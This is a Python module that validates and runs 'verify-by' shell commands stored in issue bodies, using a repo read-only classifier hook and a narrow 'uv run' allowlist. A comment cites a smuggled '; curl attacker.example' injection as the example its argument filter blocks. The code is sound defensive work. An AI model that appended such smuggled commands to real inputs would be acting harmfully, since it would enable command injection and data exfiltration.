"""The verify-by gate: what a stored command must clear before it runs, and what it means.

`findings.py open --verify-by` stores a shell command in the issue body; `findings.py verify`
runs it later and reads its exit code as the verdict. The command therefore comes back out of
human-editable prose, so it is judged before it is run — by the repo's own read-only
classifier (`.claude/hooks/auto-approve-readonly.py`, the same judgment that decides what a
session may run without a prompt), plus a narrow `uv run` allowlist the hook cannot express.

The loader for that classifier lives here rather than at the `FindingsTools` seam, because
the loader and the decision it feeds are one unit: `classify_verify_command` takes it as a
defaulted parameter, so a test can say "the hook did not load at all" — which a classifier
of None cannot express.
"""

import importlib.util
import re
import subprocess
from collections.abc import Callable

# Reach the sibling package directories: a directly-invoked script gets only its own
# directory on sys.path, and pyproject's `pythonpath` is a pytest setting.
import sys as _sys
from pathlib import Path as _Path

_sys.path.insert(0, str(_Path(__file__).resolve().parents[2]))

from dev.findings_lib.issue_model import parse_verify_by
from dev.findings_lib.boundaries import FindingsTools
from lib.repo_paths import REPO

_READONLY_HOOK = REPO / ".claude" / "hooks" / "auto-approve-readonly.py"
# A narrow allowlist layered ON TOP of the hook's classify(), not just a fallback for when
# it fails to load. `uv` is opaque to classify() by design — `uv run <anything>` can exec
# anything, so TIER1/HANDLERS has no `uv` entry at all — which means the hook alone refuses
# every command this feature exists to run: the review skill's own examples are
# `uv run python scripts/diagnostics/probe.py ...` and `uv run pytest ...`. This regex covers
# EXACTLY those two shapes and no other script: `scripts/[\w./-]+\.py` would also admit
# `scripts/backup/b2_drain.py --yes` and `scripts/secrets_mgmt/secret_rotation.py rotate`,
# both of which mutate state, so the script path is pinned to `probe.py` by name rather than
# left open to anything under `scripts/`. Each argument is further restricted to a safe
# character class so an issue body a human edited to smuggle `; curl attacker.example`
# cannot slip through — `;`, `|`, `$`, backticks and quotes are all outside `_SAFE_ARG`.
_SAFE_ARG = r"[\w./=:,-]+"
_FALLBACK_VERIFY_RE = re.compile(
    rf"^uv run (python scripts/diagnostics/probe\.py(?:\s+{_SAFE_ARG})*"
    rf"|pytest(?:\s+{_SAFE_ARG})*)$"
)

# A `classify()`: a command line in, a reason string out, or None when it is not read-only.
Classify = Callable[[str], str | None]
# A loader for one: it answers None when the hook could not be loaded at all.
LoadClassify = Callable[[], Classify | None]

DEFAULT_VERIFY_TIMEOUT = 120.0


def _load_readonly_classify() -> Classify | None:
    """The auto-approve-readonly hook's `classify()`, loaded by path, or None.

    The filename is hyphenated, so it is not importable by name. `block-protected-bash.py`
    loads its sibling hook the same way, for the same reason: one classifier judges both
    what a session can run without a prompt and what `findings.py verify` may execute.
    """
    if not _READONLY_HOOK.is_file():
        return None
    try:
        # The hook's own top-level `from _hook_common import ...` only resolves once its
        # directory is on sys.path — true automatically when it runs as the hook entry
        # point, not when loaded by path from here.
        hooks_dir = str(_READONLY_HOOK.parent)
        if hooks_dir not in _sys.path:
            _sys.path.insert(0, hooks_dir)
        spec = importlib.util.spec_from_file_location(
            "auto_approve_readonly", _READONLY_HOOK
        )
        if not spec or not spec.loader:
            return None
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module.classify
    except Exception:
        return None


def classify_verify_command(
    command: str, load_classify: LoadClassify | None = None
) -> str | None:
    """A reason string if `command` is read-only by the repo's own standard, else None.

    A union, not an either-or: the hook's `classify()` clears it, OR the narrow `uv run`
    allowlist does (see `_FALLBACK_VERIFY_RE` for why that allowlist runs even when the hook
    loaded fine). Falls back to the allowlist alone when the hook cannot be loaded at all —
    this script is run outside the checkout that carries `.claude/`.

    Args:
        command: the verify-by command line read back out of an issue body.
        load_classify: the LOADER, not the classifier: a test proving the fallback has to
            say "the hook did not load", which a classifier of None cannot express.
    """
    classify = (load_classify or _load_readonly_classify)()
    reason = classify(command) if classify is not None else None
    if reason:
        return reason
    return (
        "fallback: uv run" if _FALLBACK_VERIFY_RE.fullmatch(command.strip()) else None
    )


def verify_close_comment(command: str, output: str, *, tail_lines: int = 20) -> str:
    """The close comment `verify --close` posts on a passing finding.

    Quotes the command and the tail of its combined stdout/stderr, so the record of why an
    issue closed lives on the issue rather than only in whoever ran `verify`.
    """
    lines = output.strip("\n").splitlines()
    tail = "\n".join(lines[-tail_lines:]) if lines else "(no output)"
    return (
        "Fixed: verify-by passed.\n\n"
        f"Command:\n```\n{command}\n```\n\n"
        f"Output (tail):\n```\n{tail}\n```\n"
    )


def run_verify_by(
    command: str, timeout: float, tools: FindingsTools
) -> tuple[str, str]:
    """Runs a verify-by command and returns ``(verdict, detail)``.

    verdict is ``fixed`` (exit 0), ``still-open`` (nonzero exit) or ``error`` (refused by
    `classify_verify_command`, timed out, or could not be launched at all). detail is the
    command's combined stdout/stderr for ``fixed``/``still-open``, or the reason for
    ``error``.
    """
    reason = classify_verify_command(command)
    if not reason:
        return "error", "refused: not read-only by the repo's classifier"
    try:
        proc = tools.run_verify(command, timeout)
    except subprocess.TimeoutExpired:
        return "error", f"timed out after {timeout:g}s"
    except OSError as exc:
        return "error", str(exc)
    output = (proc.stdout or "") + (proc.stderr or "")
    return ("fixed" if proc.returncode == 0 else "still-open"), output


def verify_finding(
    issue: dict, timeout: float, tools: FindingsTools
) -> tuple[str, str, str]:
    """Verifies one issue. Returns ``(verdict, detail, command)``.

    verdict adds ``no-verify-by`` to `run_verify_by`'s three, for an issue whose body
    carries no `## Verify-by` section at all — never run, so ``command`` is empty.
    """
    command = parse_verify_by(issue.get("body") or "")
    if not command:
        return "no-verify-by", "", ""
    verdict, detail = run_verify_by(command, timeout, tools)
    return verdict, detail, command
